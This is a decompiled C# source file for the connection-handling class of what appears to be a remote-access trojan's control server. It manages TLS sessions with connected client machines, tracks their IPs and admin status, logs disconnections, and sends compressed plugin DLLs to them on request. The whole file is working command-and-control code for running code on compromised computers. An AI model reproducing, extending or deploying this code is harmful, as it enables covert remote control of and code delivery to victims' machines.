using System;
using System.Collections;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Threading;
using System.Windows.Forms;
using Server.Algorithm;
using Server.Handle_Packet;
using Server.Helper;
using Server.MessagePack;
using Server.Properties;

namespace Server.Connection
{
	// Token: 0x02000012 RID: 18
	public class Clients
	{
		// Token: 0x17000013 RID: 19
		// (get) Token: 0x060000B3 RID: 179 RVA: 0x0000BD14 File Offset: 0x0000BD14
		// (set) Token: 0x060000B4 RID: 180 RVA: 0x0000BD1C File Offset: 0x0000BD1C
		public Socket TcpClient { get; set; }

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x060000B5 RID: 181 RVA: 0x0000BD28 File Offset: 0x0000BD28
		// (set) Token: 0x060000B6 RID: 182 RVA: 0x0000BD30 File Offset: 0x0000BD30
		public SslStream SslClient { get; set; }

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x060000B7 RID: 183 RVA: 0x0000BD3C File Offset: 0x0000BD3C
		// (set) Token: 0x060000B8 RID: 184 RVA: 0x0000BD44 File Offset: 0x0000BD44
		public ListViewItem LV { get; set; }

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x060000B9 RID: 185 RVA: 0x0000BD50 File Offset: 0x0000BD50
		// (set) Token: 0x060000BA RID: 186 RVA: 0x0000BD58 File Offset: 0x0000BD58
		public ListViewItem LV2 { get; set; }

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x060000BB RID: 187 RVA: 0x0000BD64 File Offset: 0x0000BD64
		// (set) Token: 0x060000BC RID: 188 RVA: 0x0000BD6C File Offset: 0x0000BD6C
		public string ID { get; set; }

		// Token: 0x17000018 RID: 24
		// (get) Token: 0x060000BD RID: 189 RVA: 0x0000BD78 File Offset: 0x0000BD78
		// (set) Token: 0x060000BE RID: 190 RVA: 0x0000BD80 File Offset: 0x0000BD80
		private byte[] ClientBuffer { get; set; }

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x060000BF RID: 191 RVA: 0x0000BD8C File Offset: 0x0000BD8C
		// (set) Token: 0x060000C0 RID: 192 RVA: 0x0000BD94 File Offset: 0x0000BD94
		private long HeaderSize { get; set; }

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x060000C1 RID: 193 RVA: 0x0000BDA0 File Offset: 0x0000BDA0
		// (set) Token: 0x060000C2 RID: 194 RVA: 0x0000BDA8 File Offset: 0x0000BDA8
		private long Offset { get; set; }

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x060000C3 RID: 195 RVA: 0x0000BDB4 File Offset: 0x0000BDB4
		// (set) Token: 0x060000C4 RID: 196 RVA: 0x0000BDBC File Offset: 0x0000BDBC
		private bool ClientBufferRecevied { get; set; }

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x060000C5 RID: 197 RVA: 0x0000BDC8 File Offset: 0x0000BDC8
		// (set) Token: 0x060000C6 RID: 198 RVA: 0x0000BDD0 File Offset: 0x0000BDD0
		public object SendSync { get; set; }

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x060000C7 RID: 199 RVA: 0x0000BDDC File Offset: 0x0000BDDC
		// (set) Token: 0x060000C8 RID: 200 RVA: 0x0000BDE4 File Offset: 0x0000BDE4
		public long BytesRecevied { get; set; }

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x060000C9 RID: 201 RVA: 0x0000BDF0 File Offset: 0x0000BDF0
		// (set) Token: 0x060000CA RID: 202 RVA: 0x0000BDF8 File Offset: 0x0000BDF8
		public string Ip { get; set; }

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x060000CB RID: 203 RVA: 0x0000BE04 File Offset: 0x0000BE04
		// (set) Token: 0x060000CC RID: 204 RVA: 0x0000BE0C File Offset: 0x0000BE0C
		public bool Admin { get; set; }

		// Token: 0x17000020 RID: 32
		// (get) Token: 0x060000CD RID: 205 RVA: 0x0000BE18 File Offset: 0x0000BE18
		// (set) Token: 0x060000CE RID: 206 RVA: 0x0000BE20 File Offset: 0x0000BE20
		public DateTime LastPing { get; set; }

		// Token: 0x060000CF RID: 207 RVA: 0x0000BE2C File Offset: 0x0000BE2C
		public Clients(Socket socket)
		{
			this.SendSync = new object();
			this.TcpClient = socket;
			this.Ip = this.TcpClient.RemoteEndPoint.ToString().Split(new char[]
			{
				':'
			})[0];
			this.SslClient = new SslStream(new NetworkStream(this.TcpClient, true), false);
			this.SslClient.BeginAuthenticateAsServer(Settings.ServerCertificate, false, SslProtocols.Tls, false, new AsyncCallback(this.EndAuthenticate), null);
		}

		// Token: 0x060000D0 RID: 208 RVA: 0x0000BEC0 File Offset: 0x0000BEC0
		private void EndAuthenticate(IAsyncResult ar)
		{
			try
			{
				this.SslClient.EndAuthenticateAsServer(ar);
				this.Offset = 0L;
				this.HeaderSize = 4L;
				this.ClientBuffer = new byte[this.HeaderSize];
				this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
			}
			catch
			{
				SslStream sslClient = this.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = this.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
			}
		}

		// Token: 0x060000D1 RID: 209 RVA: 0x0000BF74 File Offset: 0x0000BF74
		public void ReadClientData(IAsyncResult ar)
		{
			try
			{
				if (!this.TcpClient.Connected)
				{
					this.Disconnected();
				}
				else
				{
					int num = this.SslClient.EndRead(ar);
					if (num > 0)
					{
						this.HeaderSize -= (long)num;
						this.Offset += (long)num;
						if (!this.ClientBufferRecevied)
						{
							if (this.HeaderSize == 0L)
							{
								this.HeaderSize = (long)BitConverter.ToInt32(this.ClientBuffer, 0);
								if (this.HeaderSize > 0L)
								{
									this.ClientBuffer = new byte[this.HeaderSize];
									this.Offset = 0L;
									this.ClientBufferRecevied = true;
								}
							}
							else if (this.HeaderSize < 0L)
							{
								this.Disconnected();
								return;
							}
						}
						else
						{
							object lockReceivedSendValue = Settings.LockReceivedSendValue;
							lock (lockReceivedSendValue)
							{
								Settings.ReceivedValue += (long)num;
							}
							this.BytesRecevied += (long)num;
							if (this.HeaderSize == 0L)
							{
								ThreadPool.QueueUserWorkItem(new WaitCallback(new Packet
								{
									client = this,
									data = this.ClientBuffer
								}.Read), null);
								this.Offset = 0L;
								this.HeaderSize = 4L;
								this.ClientBuffer = new byte[this.HeaderSize];
								this.ClientBufferRecevied = false;
							}
							else if (this.HeaderSize < 0L)
							{
								this.Disconnected();
								return;
							}
						}
						this.SslClient.BeginRead(this.ClientBuffer, (int)this.Offset, (int)this.HeaderSize, new AsyncCallback(this.ReadClientData), null);
					}
					else
					{
						this.Disconnected();
					}
				}
			}
			catch
			{
				this.Disconnected();
			}
		}

		// Token: 0x060000D2 RID: 210 RVA: 0x0000C178 File Offset: 0x0000C178
		public void Disconnected()
		{
			if (this.LV != null)
			{
				Program.form1.Invoke(new MethodInvoker(delegate()
				{
					try
					{
						object obj = Settings.LockListviewClients;
						lock (obj)
						{
							this.LV.Remove();
						}
						if (this.LV2 != null)
						{
							obj = Settings.LockListviewThumb;
							lock (obj)
							{
								this.LV2.Remove();
							}
						}
					}
					catch
					{
					}
					new HandleLogs().Addmsg("Client " + this.Ip + " disconnected.", Color.Red);
					if (TimeZoneInfo.Local.Id == "China Standard Time" && Settings.Default.Notification)
					{
						SoundPlayer soundPlayer = new SoundPlayer(Resources.offline);
						soundPlayer.Load();
						soundPlayer.Play();
					}
					foreach (AsyncTask asyncTask in Form1.getTasks.ToList<AsyncTask>())
					{
						asyncTask.doneClient.Remove(this.ID);
					}
				}));
			}
			try
			{
				SslStream sslClient = this.SslClient;
				if (sslClient != null)
				{
					sslClient.Dispose();
				}
				Socket tcpClient = this.TcpClient;
				if (tcpClient != null)
				{
					tcpClient.Dispose();
				}
			}
			catch
			{
			}
		}

		// Token: 0x060000D3 RID: 211 RVA: 0x0000C1F4 File Offset: 0x0000C1F4
		public bool GetListview(string id)
		{
			using (IEnumerator enumerator = Program.form1.listView4.Items.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					if (((ListViewItem)enumerator.Current).ToolTipText == id)
					{
						return true;
					}
				}
			}
			return false;
		}

		// Token: 0x060000D4 RID: 212 RVA: 0x0000C274 File Offset: 0x0000C274
		public void Send(object msg)
		{
			object sendSync = this.SendSync;
			lock (sendSync)
			{
				try
				{
					if (!this.TcpClient.Connected)
					{
						this.Disconnected();
					}
					else if ((byte[])msg != null)
					{
						byte[] array = (byte[])msg;
						byte[] bytes = BitConverter.GetBytes(array.Length);
						this.TcpClient.Poll(-1, SelectMode.SelectWrite);
						this.SslClient.Write(bytes, 0, bytes.Length);
						object lockReceivedSendValue;
						if (array.Length > 1000000)
						{
							using (MemoryStream memoryStream = new MemoryStream(array))
							{
								memoryStream.Position = 0L;
								byte[] array2 = new byte[50000];
								int num;
								while ((num = memoryStream.Read(array2, 0, array2.Length)) > 0)
								{
									this.TcpClient.Poll(-1, SelectMode.SelectWrite);
									this.SslClient.Write(array2, 0, num);
									lockReceivedSendValue = Settings.LockReceivedSendValue;
									lock (lockReceivedSendValue)
									{
										Settings.SentValue += (long)num;
									}
								}
								goto IL_176;
							}
						}
						this.TcpClient.Poll(-1, SelectMode.SelectWrite);
						this.SslClient.Write(array, 0, array.Length);
						this.SslClient.Flush();
						lockReceivedSendValue = Settings.LockReceivedSendValue;
						lock (lockReceivedSendValue)
						{
							Settings.SentValue += (long)array.Length;
						}
						IL_176:;
					}
				}
				catch
				{
					this.Disconnected();
				}
			}
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x0000C494 File Offset: 0x0000C494
		public void SendPlugin(string hash)
		{
			try
			{
				foreach (string text in Directory.GetFiles("bin", "*.dll", SearchOption.TopDirectoryOnly))
				{
					if (hash == GetHash.GetChecksum(text))
					{
						MsgPack msgPack = new MsgPack();
						msgPack.ForcePathObject("Pac_ket").SetAsString("save_Plugin");
						msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(File.ReadAllBytes(text)));
						msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(text));
						ThreadPool.QueueUserWorkItem(new WaitCallback(this.Send), msgPack.Encode2Bytes());
						new HandleLogs().Addmsg("Plugin " + Path.GetFileName(text) + " Sent to " + this.Ip, Color.Blue);
						break;
					}
				}
			}
			catch (Exception ex)
			{
				new HandleLogs().Addmsg("Clinet " + this.Ip + " " + ex.Message, Color.Red);
			}
		}
	}
}
